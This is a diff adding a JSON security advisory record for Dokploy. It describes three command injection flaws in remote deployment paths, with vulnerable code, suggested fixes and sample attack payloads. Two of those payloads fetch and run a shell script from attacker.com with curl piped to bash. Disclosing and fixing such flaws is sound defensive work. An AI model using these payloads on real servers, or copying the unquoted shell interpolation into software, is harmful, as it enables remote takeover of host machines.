@@ -1,0 +1,47 @@
+{
+  "id": "GHSA-wm5j-x54v-3fjf",
+  "aliases": [],
+  "title": "OS Command Injection in scheduler execution, Traefik config write, and Compose deployment → HOST RCE",
+  "summary": "## Summary\n\nThree separate injection points in Dokploy's application deployment pipeline use shell single-quote context or unquoted interpolation when writing to remote servers. Each has a safe local code path but a vulnerable remote path (`execAsyncRemote` via SSH).\n\n---\n\n## VULN-009 - Container Escape via schedule.command Single-Quote Breakout → HOST RCE\n\n**File**: `packages/server/src/utils/schedules/utils.ts`  \n**Lines**: 76-87 (remote path in `runSchedule`)  \n**CWE**: CWE-78 | **CVSS**: 8.0 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\n\n`schedule.command` (DB-stored `text()`, no character restriction) is embedded in a shell string using single-quotes:\n\n```typescript\n// REMOTE path (vulnerable) - single-quote breakout\nawait execAsyncRemote(\n    serverId,\n    `docker exec ${containerId} ${shellType} -c '${command}'`,  // ← single-quote breakout\n);\n\n// LOCAL path (safe) - argv array, no shell\nawait spawnAsync(\"docker\", [\"exec\", containerId, shellType, \"-c\", command], ...);\n```\n\nThis is a **container escape**: the single-quote breakout happens at the HOST shell level before `docker exec` runs. A `'` in `command` causes arbitrary code to run on the HOST, not inside the target container.\n\nAttack payload: `command = \"'; touch /tmp/host-escape; echo '\"` → `docker exec ABC bash -c ''; touch /tmp/host-escape; echo ''` → `touch /tmp/host-escape` runs on **HOST**.\n\n---\n\n## VULN-010 - Command Injection via Traefik YAML Config Single-Quote Breakout → HOST RCE\n\n**File**: `packages/server/src/utils/traefik/application.ts`  \n**Line**: 275 (`writeTraefikConfigRemote`)  \n**CWE**: CWE-78 | **CVSS**: 8.0 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\n\n`writeTraefikConfigRemote` serializes a YAML Traefik config and writes it using `echo '${yamlStr}'`. User-controlled domain fields (path prefixes, middleware parameters) flow into `yamlStr`. A `'` in any such field breaks out of the single-quote context:\n\n```typescript\nexport const writeTraefikConfigRemote = async (traefikConfig: FileConfig, appName: string, serverId: string) => {\n    const yamlStr = stringify(traefikConfig);\n    await execAsyncRemote(serverId, `echo '${yamlStr}' > ${configPath}`);  // ← UNQUOTED\n};\n```\n\nThe safe sibling `writeConfigRemote` (line 213) correctly uses base64 encoding:\n```typescript\nconst encoded = encodeBase64(traefikConfig);\nawait execAsyncRemote(serverId, `echo \"${encoded}\" | base64 -d > \"${configPath}\"`);  // SAFE\n```\n\nAttack: set `internalPath = \"/api'$(curl attacker.com/shell|bash)#\"` in domain settings → single-quote breakout → HOST RCE.\n\n---\n\n## VULN-014 - Command Injection via composePath in docker compose Deployment → HOST RCE\n\n**File**: `packages/server/src/services/compose.ts`  \n**Line**: 475 (`startCompose`)  \n**CWE**: CWE-78 | **CVSS**: 8.0 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\n\n`compose.composePath` (`z.string().min(1)`, no regex) is interpolated unquoted into the `-f` flag of docker compose:\n\n```typescript\nconst path = compose.sourceType === \"raw\" ? \"docker-compose.yml\" : compose.composePath;\nconst baseCommand = `env -i PATH=\"$PATH\" docker compose -p ${compose.appName} -f ${path} up -d`;\nawait execAsyncRemote(compose.serverId, `cd ${projectPath} && ${baseCommand}`);\n```\n\nCondition: `sourceType` must be `\"git\"`, `\"github\"`, or `\"gitlab\"` (not `\"raw\"`).\n\nAttack: `composePath = \"docker-compose.yml; curl attacker.com/shell | bash #\"` → HOST RCE on deploy.\n\n---\n\n## Recommended Fixes\n\n```typescript\n// VULN-009: use quote() on command field\nawait execAsyncRemote(serverId, `docker exec ${containerId} ${shellType} -c ${quote([command])}`);\n\n// VULN-010: use base64 pattern (already implemented in writeConfigRemote)\nconst encoded = encodeBase64(stringify(traefikConfig));\nawait execAsyncRemote(serverId, `echo \"${encoded}\" | base64 -d > \"${configPath}\"`);\n\n// VULN-014: quote composePath\nconst safePath = compose.sourceType === \"raw\" ? \"docker-compose.yml\" : quote([compose.composePath]);\nconst baseCommand = `env -i PATH=\"$PATH\" docker compose -p ${quo...",
+  "published_at": "2026-11-12T08:17:02.000Z",
+  "modified_at": "2026-11-12T08:17:02.000Z",
+  "severity": {
+    "level": "high",
+    "score": null,
+    "vector": null,
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "affected": [
+    {
+      "product": "dokploy",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "0.29.13"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-wm5j-x54v-3fjf",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-wm5j-x54v-3fjf",
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-wm5j-x54v-3fjf",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:c2b0d15386c351e9ed495b68d03aba331699cf89740220916d57d91b66fd5dcb",
+  "note": null
+}
